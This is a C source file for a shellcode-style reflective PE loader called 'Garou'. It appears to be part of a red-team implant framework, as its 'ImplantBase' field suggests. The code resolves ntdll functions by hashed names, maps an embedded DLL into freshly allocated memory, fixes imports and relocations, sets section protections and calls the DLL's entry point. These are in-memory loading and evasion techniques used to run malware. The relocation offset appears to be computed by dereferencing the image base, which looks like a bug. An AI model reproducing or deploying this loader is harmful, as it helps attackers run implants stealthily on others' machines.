#include <windows.h>
#include <win32.h>
#include <common.h>
#include <native.h>
#include <constexpr.h>

typedef struct _GAROU_ARGS {
    PVOID ImplantBase;
    DWORD ImplantSize;
    PVOID TxtBase;
    PVOID TxtSize;
} GAROU_ARGS, *PGAROU_ARGS; 

D_SEC( B ) BOOL ResolveIat(
	_In_ PGAROU_API            GarouApi,
	_In_ PIMAGE_DATA_DIRECTORY EntryImport,
	_In_ UINT64 			   BaseAddress
) {
	PIMAGE_IMPORT_DESCRIPTOR ImportDesc = BaseAddress + EntryImport->VirtualAddress;

	for ( INT i = 0; ImportDesc->Name; ImportDesc++ ) {

		PIMAGE_THUNK_DATA IAT = BaseAddress + ImportDesc->FirstThunk;
		PIMAGE_THUNK_DATA ILT = BaseAddress + ImportDesc->OriginalFirstThunk;

		PCHAR DllName = BaseAddress + ImportDesc->Name;

		HMODULE hDll = LdrLoadModule( HashString( DllName, 0 ) );
		if (!hDll) {
			hDll = LdrLoadLib( GarouApi, DllName );
			if (!hDll) {
				return FALSE;
			}
		}

		for (; ILT->u1.Function; IAT++, ILT++) {

			if ( IMAGE_SNAP_BY_ORDINAL( ILT->u1.Ordinal ) ) {
				LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(ILT->u1.Ordinal);
				IAT->u1.Function       = (DWORD_PTR)LdrLoadFunc(hDll, HashString( functionOrdinal, 0 ) );

				if ( !IAT->u1.Function ){
					return FALSE;
				}

			} else {
				IMAGE_IMPORT_BY_NAME* Hint = BaseAddress + ILT->u1.AddressOfData;
				IAT->u1.Function = LdrLoadFunc(hDll, HashString( Hint->Name, 0 ) );

				if ( !IAT->u1.Function ){
					return FALSE;
				}

			}
		}
	}
	
	return TRUE;
}

D_SEC( B ) BOOL FixRelocTable(
    _In_ PIMAGE_DATA_DIRECTORY EntryReloc,
    _In_ UINT64                BaseAddress,
    _In_ UINT64                RelocOffset
) {
    PIMAGE_BASE_RELOCATION ImgBaseReloc = (PIMAGE_BASE_RELOCATION)(BaseAddress + EntryReloc->VirtualAddress);

    while ( ImgBaseReloc->VirtualAddress ) {
        PBASE_RELOCATION_ENTRY EntryBaseReloc = (PBASE_RELOCATION_ENTRY)((UINT8*)ImgBaseReloc + sizeof(IMAGE_BASE_RELOCATION));
        UINT32 EntryCount = (ImgBaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);

        for ( INT i = 0; i < EntryCount; i++ ) {
            UINT64 RelocAddress = (UINT64)(BaseAddress + ImgBaseReloc->VirtualAddress + EntryBaseReloc[i].Offset);

            switch ( EntryBaseReloc[i].Type ) {
                case IMAGE_REL_BASED_DIR64:
                    *(UINT64 *)RelocAddress += (UINT64)( RelocOffset); break;
                case IMAGE_REL_BASED_HIGHLOW:
                    *(DWORD *)RelocAddress += (DWORD)( RelocOffset); break;
                case IMAGE_REL_BASED_HIGH:
                    *(WORD *)RelocAddress += (WORD)( HIWORD( RelocOffset ) ); break;
                case IMAGE_REL_BASED_LOW:
                    *(WORD *)RelocAddress += (WORD)( LOWORD( RelocOffset ) ); break;
                case IMAGE_REL_BASED_ABSOLUTE:
                    break;
                default:
                    break;
            }
        }

        ImgBaseReloc = (PIMAGE_BASE_RELOCATION)((UINT8*) ImgBaseReloc + ImgBaseReloc->SizeOfBlock );
    }

    return TRUE;
}

D_SEC( B ) PVOID GarouLdr( 
	LPVOID lpParameter 
) {
	UINT64 GarouBase = GarouStart() + ( U_PTR( GarouRipEnd() ) - U_PTR( GarouStart() ) ) ;
	
	GAROU_API  GarouApi  = { 0 };
	GAROU_ARGS GarouArgs = { 0 };

	UINT32 Protection	 = 0;
	UINT32 OldProtection = 0;
    PBYTE  ImageBase     = NULL;
	UINT64 ImageSize     = 0;
	UINT32 RelocOffset   = 0;
	PVOID  ProtBase      = NULL;
	UINT64 ProtSize      = 0;

	PIMAGE_NT_HEADERS		ImgNtHdrs   = { 0 };
	PIMAGE_SECTION_HEADER   SecHdr      = { 0 };
    PIMAGE_DATA_DIRECTORY   EntryReloc  = { 0 };
    PIMAGE_DATA_DIRECTORY   EntryImport = { 0 };

	PVOID Ntdll = LdrLoadModule( HASH_STR( "ntdll.dll" ) );

	GarouApi.NtAllocateVirtualMemory = LdrLoadFunc( Ntdll, HASH_STR( "NtAllocateVirtualMemory" ) );
	GarouApi.NtProtectVirtualMemory  = LdrLoadFunc( Ntdll, HASH_STR( "NtProtectVirtualMemory" ) );
	GarouApi.NtFlushInstructionCache = LdrLoadFunc( Ntdll, HASH_STR( "NtFlushInstructionCache" ) );
	GarouApi.LdrLoadDll              = LdrLoadFunc( Ntdll, HASH_STR( "LdrLoadDll" ) );

	ImgNtHdrs   = ( GarouBase + ( (PIMAGE_DOS_HEADER)GarouBase )->e_lfanew );
    SecHdr      = IMAGE_FIRST_SECTION( ImgNtHdrs );
    EntryImport = &ImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    EntryReloc  = &ImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	ImageSize = ImgNtHdrs->OptionalHeader.SizeOfImage;

    GarouApi.NtAllocateVirtualMemory( NtCurrentProcess(), &ImageBase, 0, &ImageSize, 0x3000, 0x4 );

    for ( int i = 0 ; i < ImgNtHdrs->FileHeader.NumberOfSections; i++ ) {
        MemCopy(
            C_PTR( ImageBase + SecHdr[i].VirtualAddress ),
            C_PTR( GarouBase + SecHdr[i].PointerToRawData ),
            SecHdr[i].SizeOfRawData
        );
    }

    RelocOffset = DEREF_64( ImageBase ) - ImgNtHdrs->OptionalHeader.ImageBase;

	ResolveIat( &GarouApi, EntryImport, ImageBase );
	FixRelocTable( EntryReloc, U_PTR( ImageBase ), U_PTR( RelocOffset ) );

    for ( int i = 0; i < ImgNtHdrs->FileHeader.NumberOfSections; i++ ) {

		if ( !SecHdr[i].SizeOfRawData || !SecHdr[i].VirtualAddress )
			continue;

		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE )
			Protection = PAGE_WRITECOPY;

		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ )
			Protection = PAGE_READONLY;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			Protection = PAGE_READWRITE;

		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE )
			Protection = PAGE_EXECUTE;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) )
			Protection = PAGE_EXECUTE_WRITECOPY;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			Protection = PAGE_EXECUTE_READ;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			Protection = PAGE_EXECUTE_READWRITE;

		ProtBase = C_PTR( ImageBase + SecHdr[i].VirtualAddress );
		ProtSize = SecHdr[i].SizeOfRawData;
		GarouApi.NtProtectVirtualMemory( NtCurrentProcess(), &ProtBase, &ProtSize, Protection, &OldProtection );
	}

	GarouApi.NtFlushInstructionCache( NtCurrentProcess(), NULL, 0 );

	ULONG_PTR EntryPoint = ( U_PTR( ImageBase ) + ImgNtHdrs->OptionalHeader.AddressOfEntryPoint );

	( (fnDllMain)EntryPoint )( (HINSTANCE)ImageBase, DLL_PROCESS_ATTACH, NULL );

	return EntryPoint;
}
